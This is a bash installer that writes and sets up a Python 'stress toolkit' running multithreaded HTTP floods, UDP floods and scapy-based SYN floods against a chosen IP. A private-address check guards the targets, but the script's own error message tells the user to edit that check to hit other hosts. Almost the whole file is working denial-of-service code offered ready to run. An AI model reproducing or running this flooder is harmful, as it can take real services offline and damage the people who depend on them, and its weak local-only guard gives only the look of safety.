#!/bin/bash
set -e
echo "🚀 Installing stress toolkit..."
sudo apt update -qq && sudo apt install -y -qq python3-pip nmap netcat-openbsd 2>/dev/null
sudo pip3 install scapy flask -q
mkdir -p ~/pentools
cat > ~/pentools/stress.py << 'TOOL'
#!/usr/bin/env python3
import sys, time, socket, threading, os, random
def check(ip):
    for n in ["192.168.", "10.", "172.16.", "127.0.0."]:
        if ip.startswith(n): return True
    return False
def http_flood(ip, dur, threads=30):
    end=time.time()+dur; c=[0]
    def w():
        while time.time()<end:
            try:
                s=socket.socket(); s.settimeout(3)
                s.connect((ip,80))
                s.send(("GET / HTTP/1.1\r\nHost: "+ip+"\r\nUser-Agent: "+random.choice(["Mozilla/5.0","Chrome/120","Safari/617"])+"\r\nConnection: keep-alive\r\n\r\n").encode())
                s.recv(256); s.close(); c[0]+=1
            except: pass
    for _ in range(threads): threading.Thread(target=w).start()
    while time.time()<end: time.sleep(1); print(f"  {c[0]} req...",end="\r")
    print(f"\nDone: {c[0]} req")
def udp_flood(ip, dur):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    end=time.time()+dur; c=[0]
    def w():
        while time.time()<end:
            try: sock.sendto(os.urandom(1024),(ip,random.choice([53,80,443]))); c[0]+=1
            except: pass
    for _ in range(10): threading.Thread(target=w).start()
    while time.time()<end: time.sleep(1); print(f"  {c[0]} pkt...",end="\r")
    print(f"\nDone: {c[0]} pkt")
def syn_flood(ip, dur, threads=20):
    try:
        from scapy.all import IP,TCP,send
    except:
        print("No scapy, try http-flood"); return
    end=time.time()+dur; c=[0]
    def w():
        while time.time()<end:
            send(IP(dst=ip)/TCP(dport=random.choice([80,443,8080,22]),flags="S"),verbose=False)
            c[0]+=1
    for _ in range(threads): threading.Thread(target=w).start()
    while time.time()<end: time.sleep(1); print(f"  {c[0]} syn...",end="\r")
    print(f"\nDone: {c[0]} syn")
if __name__=="__main__":
    if len(sys.argv)<3:
        print("Usage: python3 stress.py <ip> <method> [duration]")
        print("Methods: http-flood, udp-flood, syn-flood"); sys.exit(1)
    ip=sys.argv[1]; m=sys.argv[2]
    d=int(sys.argv[3]) if len(sys.argv)>3 else 30
    if not check(ip): print(f"BLOCKED: {ip} not local. Edit check() to allow."); sys.exit(1)
    {"http-flood":http_flood,"udp-flood":udp_flood,"syn-flood":syn_flood}[m](ip,d)
TOOL
chmod +x ~/pentools/stress.py
echo ""
echo "✅ Ready! Usage:"
echo "   python3 ~/pentools/stress.py <target> http-flood 60"
